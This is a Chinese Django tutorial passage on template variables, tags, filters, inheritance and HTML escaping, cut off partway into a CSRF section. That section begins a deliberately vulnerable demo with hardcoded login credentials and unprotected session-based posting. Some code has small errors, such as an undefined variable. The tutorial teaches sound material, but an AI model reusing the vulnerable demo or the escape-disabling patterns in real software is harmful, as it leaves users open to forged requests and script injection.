<h1 id="模板语言"><a href="#模板语言" class="headerlink" title="模板语言"></a>模板语言</h1><h2 id="模板变量"><a href="#模板变量" class="headerlink" title="模板变量"></a>模板变量</h2><p>模板变量的作用是计算并输出，变量名必须由字母、数字、下划线（不能以下划线开头）和点组成。</p>
<p>语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;变量&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>当模版引擎遇到点如 book.title，会按照下列顺序解析：</p>
<ol>
<li>字典 <code>book[&#39;title&#39;]</code> 。</li>
<li>先属性后方法，将 <code>book</code> 当作对象，查找属性 <code>title</code> ，如果没有再查找方法 <code>title()</code> 。</li>
<li>如果是格式为 <code>book.0</code> 则解析为列表 <code>book[0]</code> 。</li>
</ol>
<blockquote>
<p>如果变量不存在则插入空字符串’’。</p>
</blockquote>
<p>在模板中调用方法时不能传递参数。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>1）打开 <code>booktest/views.py</code> 文件，创建视图 temp_var 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def temp_var(request):</span><br><span class="line">    dict=&#123;&#x27;title&#x27;:&#x27;字典键值&#x27;&#125;</span><br><span class="line">    book=BookInfo()</span><br><span class="line">    book.btitle=&#x27;对象属性&#x27;</span><br><span class="line">    context=&#123;&#x27;dict&#x27;:dict,&#x27;book&#x27;:book&#125;</span><br><span class="line">    return render(request,&#x27;booktest/temp_var.html&#x27;,context)</span><br></pre></td></tr></table></figure>

<p>2）打开 booktest&#x2F;urls.py 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^temp_var/$&#x27;, views.temp_var),</span><br></pre></td></tr></table></figure>

<p>3）修改在 <code>templates/booktest</code> 下创建 <code>temp_var.html</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;模板变量&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">模板变量：&lt;br/&gt;</span><br><span class="line">&#123;&#123; dic.title &#125;&#125; &lt;br/&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">对象属性：</span><br><span class="line">&#123;&#123; book.btitle &#125;&#125; &lt;br/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，在浏览器中输入如下网址，浏览效果如下图。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/temp_var/</span><br></pre></td></tr></table></figure>

<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-04-21-43-31.png" class="">

<h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%代码段%&#125;</span><br></pre></td></tr></table></figure>

<p>for 标签语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%for item in 列表%&#125;</span><br><span class="line">循环逻辑</span><br><span class="line">&#123;&#123;forloop.counter&#125;&#125;表示当前是第几次循环，从1开始</span><br><span class="line">&#123;%empty%&#125;</span><br><span class="line">列表为空或不存在时执行此逻辑</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>

<p>if 标签语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%if ...%&#125;</span><br><span class="line">逻辑1</span><br><span class="line">&#123;%elif ...%&#125;</span><br><span class="line">逻辑2</span><br><span class="line">&#123;%else%&#125;</span><br><span class="line">逻辑3</span><br><span class="line">&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>

<p>比较运算符如下：</p>
<blockquote>
<p>注意：运算符左右两侧不能紧挨变量或常量，必须有空格。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">==</span><br><span class="line">!=</span><br><span class="line">&lt;</span><br><span class="line">&gt;</span><br><span class="line">&lt;=</span><br><span class="line">&gt;=</span><br></pre></td></tr></table></figure>

<p>布尔运算符如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and</span><br><span class="line">or</span><br><span class="line">not</span><br></pre></td></tr></table></figure>

<p>点击查看<a href="http://python.usyiyi.cn/translate/django_182/ref/templates/builtins.html">内建标签</a>了解更多标签，还有一些常用的标签会在后续地章节中讲解。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p>1）打开 <code>booktest/views.py</code> 文件，创建视图 temp_tag 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from booktest.models import BookInfo</span><br><span class="line">def temp_tags(request):</span><br><span class="line">    context = &#123;&quot;list&quot;:BookInfo.objects.all()&#125;</span><br><span class="line">    return render(request, &#x27;booktest/temp_tags.html&#x27;, context)</span><br></pre></td></tr></table></figure>

<p>2）打开 <code>booktest/urls.py</code> 文件，配置 url 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^temp_tag/$&#x27;, views.temp_tags),</span><br></pre></td></tr></table></figure>

<p>3）在 <code>templates/booktest</code> 下创建 <code>temp_tag.html</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;标签&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">图书列表如下：</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;% for book in list %&#125;</span><br><span class="line">        &#123;% if book.id &lt;= 2 %&#125;</span><br><span class="line">            &lt;li style=&quot;background-color: red&quot;&gt;&#123;&#123; book.btitle &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &#123;% elif book.id &lt;= 4 %&#125;</span><br><span class="line">             &lt;li style=&quot;background-color: blue&quot;&gt;&#123;&#123; book.btitle &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">             &lt;li style=&quot;background-color: greenyellow&quot;&gt;&#123;&#123; book.btitle &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">        &#123;% empty %&#125;</span><br><span class="line">            &lt;li&gt;对不起，没有图书&lt;/li&gt;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，在浏览器中输入如下网址，浏览效果如下图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/temp_tags/</span><br></pre></td></tr></table></figure>

<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-04-21-57-34.png" class="">

<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>语法如下:</p>
<ul>
<li>使用管道符号|来应用过滤器，用于进行计算、转换操作，可以使用在变量、标签中。</li>
<li>如果过滤器需要参数，则使用冒号:传递参数。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量|过滤器:参数</span><br></pre></td></tr></table></figure>

<p>长度 length ，返回字符串包含字符的个数，或列表、元组、字典的元素个数。</p>
<p>默认值 default，如果变量不存在时则返回默认值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data|default:&#x27;默认值&#x27;</span><br></pre></td></tr></table></figure>

<p>日期 date，用于对日期类型的值进行字符串格式化，常用的格式化字符如下：</p>
<ul>
<li>Y 表示年，格式为 4 位，y 表示两位的年。</li>
<li>m 表示月，格式为 01,02,12 等。</li>
<li>d 表示日, 格式为 01,02 等。</li>
<li>j 表示日，格式为 1,2 等。</li>
<li>H 表示时，24 进制，h 表示 12 进制的时。</li>
<li>i 表示分，为 0-59。</li>
<li>s 表示秒，为 0-59。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">value|date:&quot;Y年m月j日  H时i分s秒&quot;</span><br></pre></td></tr></table></figure>

<p>点击查看<a href="http://python.usyiyi.cn/translate/django_182/ref/templates/builtins.html">内建过滤器</a>了解更多过滤器。</p>
<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><p>1）打开 <code>booktest/views.py</code> 文件，创建视图 temp_filter 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def temp_filter(request):</span><br><span class="line">    context=&#123;&#x27;list&#x27;:BookInfo.objects.all()&#125;</span><br><span class="line">    return render(request,&#x27;booktest/temp_filter.html&#x27;,context)</span><br></pre></td></tr></table></figure>

<p>2）打开 <code>booktest/urls.py</code> 文件，配置 <code>url</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^temp_filter/$&#x27;, views.temp_filter),</span><br></pre></td></tr></table></figure>

<p>3）在 <code>templates/booktest</code>下创建 <code>temp_filter.html</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;过滤器&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">图书列表如下：</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;%for book in list%&#125;</span><br><span class="line">        &#123;%if book.btitle|length &gt; 4%&#125;</span><br><span class="line">            &lt;li style=&quot;background-color: red;&quot;&gt;</span><br><span class="line">                &#123;&#123;book.btitle&#125;&#125;</span><br><span class="line">                ---默认时间格式为：</span><br><span class="line">                &#123;&#123;book.bpub_date&#125;&#125;</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">        &#123;%else%&#125;</span><br><span class="line">            &lt;li style=&quot;background-color: green;&quot;&gt;</span><br><span class="line">                &#123;&#123;book.btitle&#125;&#125;</span><br><span class="line">                ---格式化时间为：</span><br><span class="line">                &#123;&#123;book.bpub_date|date:&quot;Y-m-j&quot;&#125;&#125;</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">        &#123;%endif%&#125;</span><br><span class="line">    &#123;%endfor%&#125;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，在浏览器中输入如下网址，浏览效果如下图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/temp_filter/</span><br></pre></td></tr></table></figure>

<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-04-22-10-03.png" class="">

<h2 id="自定义过滤器"><a href="#自定义过滤器" class="headerlink" title="自定义过滤器"></a>自定义过滤器</h2><p>过滤器就是 python 中的函数，注册后就可以在模板中当作过滤器使用，下面以求余为例开发一个自定义过滤器 mod 。</p>
<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><p>1）在应用中创建 templatetags 目录，当前示例为 <code>booktest/templatetags</code> ，创建 <code>__init__.py</code> 文件，内容为空。</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-04-22-12-48.png" class="">

<p>2）在 <code>booktest/templatetags</code> 目录下创建 <code>filters.py</code>文件，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入Library类</span><br><span class="line">from django.template import Library</span><br><span class="line"></span><br><span class="line">#创建一个Library类对象</span><br><span class="line">register=Library()</span><br><span class="line"></span><br><span class="line">#使用装饰器进行注册</span><br><span class="line">@register.filter</span><br><span class="line">#定义求余函数mod，将value对2求余</span><br><span class="line">def mod(value):</span><br><span class="line">    return value%2 == 0</span><br></pre></td></tr></table></figure>

<p>3）在 templates&#x2F;booktest&#x2F;temp_filter.html 中，使用自定义过滤器。</p>
<ul>
<li>首先使用 load 标签引入模块。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%load filters%&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在遍历时添加如下代码：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% elif book.id|mod %&#125;</span><br><span class="line">    &lt;li style=&quot;background-color: yellow&quot;&gt;</span><br><span class="line">    &#123;&#123; book.btitle &#125;&#125;</span><br><span class="line">    ---默认时间格式</span><br><span class="line">    &#123;&#123; book.bpub_date &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，浏览效果如下：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-04-22-20-04.png" class="">

<p>过滤器可以接收参数，将 <code>booktest/templatetags/filters.py</code> 中增加 mod_num 函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用装饰器进行注册</span><br><span class="line">@register.filter</span><br><span class="line">#定义求余函数mod_num，将value对num求余</span><br><span class="line">def mod_num(value,num):</span><br><span class="line">    return value%num</span><br></pre></td></tr></table></figure>

<p>5）在 <code>templates/booktest/temp_filter.html</code> 中修改遍历时判断代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% elif book.id|mod_num:3 %&#125;</span><br><span class="line">    &lt;li style=&quot;background-color: cornflowerblue&quot;&gt;</span><br><span class="line">    &#123;&#123; book.btitle &#125;&#125;</span><br><span class="line">    ---默认时间格式</span><br><span class="line">    &#123;&#123; book.bpub_date &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>6）运行服务器，浏览效果如下：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-04-22-24-29.png" class="">

<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>在模板中使用如下模板注释，这段代码不会被编译，不会输出到客户端；html 注释只能注释 html 内容，不能注释模板语言。</p>
<p>1）单行注释语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;#...#&#125;</span><br></pre></td></tr></table></figure>

<p>注释可以包含任何模版代码，有效的或者无效的都可以。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;# &#123; % if foo % &#125;bar&#123; % else % &#125; #&#125;</span><br></pre></td></tr></table></figure>

<p>2）多行注释使用 comment 标签，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%comment%&#125;</span><br><span class="line">...</span><br><span class="line">&#123;%endcomment%&#125;</span><br></pre></td></tr></table></figure>

<h1 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h1><p>模板继承和类的继承含义是一样的，主要是为了提高代码重用，减轻开发人员的工作量。</p>
<p><strong>典型应用：网站的头部、尾部信息。</strong></p>
<h2 id="父模板"><a href="#父模板" class="headerlink" title="父模板"></a>父模板</h2><p>如果发现在多个模板中某些内容相同，那就应该把这段内容定义到父模板中。</p>
<p><code>标签 block</code> ：用于在父模板中预留区域，留给子模板填充差异性的内容，名字不能相同。 为了更好的可读性，建议给 endblock 标签写上名字，这个名字与对应的 block 名字相同。父模板中也可以使用上下文中传递过来的数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%block 名称%&#125;</span><br><span class="line">预留区域，可以编写默认内容，也可以没有默认内容</span><br><span class="line">&#123;%endblock  名称%&#125;</span><br></pre></td></tr></table></figure>

<h2 id="子模板"><a href="#子模板" class="headerlink" title="子模板"></a>子模板</h2><p><code>标签 extends</code> ：继承，写在子模板文件的第一行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% extends &quot;父模板路径&quot;%&#125;</span><br></pre></td></tr></table></figure>

<p>子模版不用填充父模版中的所有预留区域，如果子模版没有填充，则使用父模版定义的默认值。</p>
<p>填充父模板中指定名称的预留区域。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%block 名称%&#125;</span><br><span class="line">实际填充内容</span><br><span class="line">&#123;&#123;block.super&#125;&#125;用于获取父模板中block的内容</span><br><span class="line">&#123;%endblock 名称%&#125;</span><br></pre></td></tr></table></figure>

<h3 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h3><p>1）打开 <code>booktest/views.py</code> 文件，创建视图 temp_inherit 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def temp_inherit(request):</span><br><span class="line">    context=&#123;&#x27;title&#x27;:&#x27;模板继承&#x27;,&#x27;list&#x27;:BookInfo.objects.all()&#125;</span><br><span class="line">    return render(request,&#x27;booktest/temp_inherit.html&#x27;,context)</span><br></pre></td></tr></table></figure>

<p>2）打开 <code>booktest/urls.py</code> 文件，配置 url 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^temp_inherit/$&#x27;, views.temp_inherit),</span><br></pre></td></tr></table></figure>

<p>3）在 templates 下创建 <code>inherit_base.html</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;这是头&lt;/h2&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&#123;%block qu1%&#125;</span><br><span class="line">这是区域一，有默认值</span><br><span class="line">&#123;%endblock qu1%&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&#123;%block qu2%&#125;</span><br><span class="line">&#123;%endblock qu2%&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;h2&gt;这是尾&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）在 <code>templates/booktest</code> 下创建 <code>temp_inherit.html</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%extends &#x27;booktest/inherit_base.html&#x27;%&#125;</span><br><span class="line">&#123;%block qu2%&#125;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;%for book in list%&#125;</span><br><span class="line">    &lt;li&gt;&#123;&#123;book.btitle&#125;&#125;&lt;/li&gt;</span><br><span class="line">    &#123;%endfor%&#125;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&#123;%endblock qu2%&#125;</span><br></pre></td></tr></table></figure>

<p>5）运行服务器，在浏览器中输入如下网址,浏览效果如下图。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/temp_inherit/</span><br></pre></td></tr></table></figure>

<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-04-22-34-10.png" class="">

<h2 id="HTML-转义"><a href="#HTML-转义" class="headerlink" title="HTML 转义"></a>HTML 转义</h2><p>模板对上下文传递的字符串进行输出时，会对以下字符自动转义。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小于号&lt; 转换为 &amp;lt;</span><br><span class="line"></span><br><span class="line">大于号&gt; 转换为 &amp;gt;</span><br><span class="line"></span><br><span class="line">单引号&#x27; 转换为 &amp;#39;</span><br><span class="line"></span><br><span class="line">双引号&quot; 转换为 &amp;quot;</span><br><span class="line"></span><br><span class="line">与符号&amp; 转换为 &amp;amp;</span><br></pre></td></tr></table></figure>

<h3 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h3><p>1）打开 <code>booktest/views.py</code> 文件，创建视图 html_escape 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def html_escape(request):</span><br><span class="line">    context=&#123;&#x27;content&#x27;:&#x27;&lt;h1&gt;hello world&lt;/h1&gt;&#x27;&#125;</span><br><span class="line">    return render(request,&#x27;booktest/html_escape.html&#x27;,context)</span><br></pre></td></tr></table></figure>

<p>2）打开 <code>booktest/urls.py</code> 文件，配置 url 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^html_escape/$&#x27;, views.html_escape),</span><br></pre></td></tr></table></figure>

<p>3）在 <code>templates/booktest/</code> 目录下创建 <code>html_escape.html</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;转义&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">自动转义：&#123;&#123;content&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，在浏览器中输入如下网址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/html_escape/</span><br></pre></td></tr></table></figure>

<blockquote>
<p>转义后标记代码不会被直接解释执行，而是被直接呈现，防止客户端通过嵌入 js 代码攻击网站.</p>
</blockquote>
<p>浏览效果如下图:</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-11-02-15.png" class="">

<h2 id="关闭转义"><a href="#关闭转义" class="headerlink" title="关闭转义"></a>关闭转义</h2><p>过滤器 <code>escape</code> 可以实现对变量的 html 转义，默认模板就会转义，一般省略。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;t1|escape&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>过滤器 <code>safe</code>：禁用转义，告诉模板这个变量是安全的，可以解释执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;data|safe&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>1）修改 templates&#x2F;booktest&#x2F;html_escape.html 代码如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;转义&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">自动转义：&#123;&#123;content&#125;&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">过滤器safe关闭转义：&#123;&#123;content|safe&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-11-07-07.png" class="">

<p>标签 <code>autoescape</code> ：设置一段代码都禁用转义，接受 on、off 参数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% autoescape off %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endautoescape %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1）修改 <code>templates/booktest/html_escape.html</code> 代码如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;转义&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">自动转义：&#123;&#123;content&#125;&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">过滤器safe关闭转义：&#123;&#123;content|safe&#125;&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">标签autoescape关闭转义：</span><br><span class="line">&#123;%autoescape off%&#125;</span><br><span class="line">&#123;&#123;content&#125;&#125;</span><br><span class="line">&#123;%endautoescape%&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>刷新浏览器后效果如下图：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-11-11-53.png" class="">

<h2 id="字符串字面值"><a href="#字符串字面值" class="headerlink" title="字符串字面值"></a>字符串字面值</h2><p>对于在模板中硬编码的 html 字符串，不会转义。</p>
<p>1）修改 <code>templates/booktest/html_escape.html</code> 代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;转义&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">自动转义：&#123;&#123;content&#125;&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">过滤器safe关闭转义：&#123;&#123;content|safe&#125;&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">标签autoescape关闭转义：</span><br><span class="line">&#123;%autoescape off%&#125;</span><br><span class="line">&#123;&#123;content&#125;&#125;</span><br><span class="line">&#123;%endautoescape%&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">模板硬编码不转义：&#123;&#123;data|default:&#x27;&lt;h1&gt;hello&lt;/h1&gt;&#x27;&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>2）刷新浏览器后效果如下图：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-11-14-39.png" class="">

<p>如果希望出现转义的效果，则需要手动编码转义。</p>
<p>1）修改 templates&#x2F;booktest&#x2F;html_escape.html 代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;转义&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">自动转义：&#123;&#123;content&#125;&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">过滤器safe关闭转义：&#123;&#123;content|safe&#125;&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">标签autoescape关闭转义：</span><br><span class="line">&#123;%autoescape off%&#125;</span><br><span class="line">&#123;&#123;content&#125;&#125;</span><br><span class="line">&#123;%endautoescape%&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">模板硬编码不转义：&#123;&#123;data|default:&#x27;&lt;h1&gt;hello&lt;/h1&gt;&#x27;&#125;&#125;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">模板硬编码手动转义：&#123;&#123;data|default:&quot;&amp;lt;h1&amp;gt;123&amp;lt;/h1&amp;gt;&quot;&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>2）刷新浏览器后效果如下图：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-11-16-22.png" class="">

<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF 全拼为 <code>Cross Site Request Forgery</code> ，译为跨站请求伪造。CSRF 指攻击者盗用了你的身份，以你的名义发送恶意请求。</p>
<p>CSRF 示意图如下：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-11-17-40.png" class="">

<p>如果想防止 CSRF ，首先是重要的信息传递都采用 POST 方式而不是 GET 方式，接下来就说 POST 请求的攻击方式以及在 Django 中的避免。</p>
<h2 id="示例-6"><a href="#示例-6" class="headerlink" title="示例"></a>示例</h2><p>攻击过程的操作了解即可，不需要重现。</p>
<p>1）打开 <code>booktest/views.py</code> 文件，创建视图 login ， login_check , post 和 post_action 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def login(reqeust):</span><br><span class="line">    return render(reqeust, &#x27;booktest/login.html&#x27;)</span><br><span class="line"></span><br><span class="line">def login_check(request):</span><br><span class="line">    username = request.POST.get(&#x27;username&#x27;) #获取用户名</span><br><span class="line">    password = request.POST.get(&#x27;password&#x27;) #获取密码</span><br><span class="line"></span><br><span class="line">    # 校验</span><br><span class="line">    if username == &#x27;smart&#x27; and password == &#x27;123&#x27;:</span><br><span class="line">        request.session[&#x27;username&#x27;]=name #记住登录用户名</span><br><span class="line">        request.session[&#x27;islogin&#x27;]=True　#判断用户是否已登录</span><br><span class="line">        return redirect(&#x27;/post/&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        return redirect(&#x27;／login/&#x27;)</span><br><span class="line"></span><br><span class="line">def post(request):</span><br><span class="line">    return render(request, &#x27;booktest/post.html&#x27;)</span><br><span class="line"></span><br><span class="line">def post_action(request):</span><br><span class="line">    if request.session[&#x27;islogin&#x27;]:</span><br><span class="line">        username = request.session[&#x27;username&#x27;]</span><br><span class="line">        return HttpResponse(&#x27;用户&#x27;+username+&#x27;发了一篇帖子&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        return 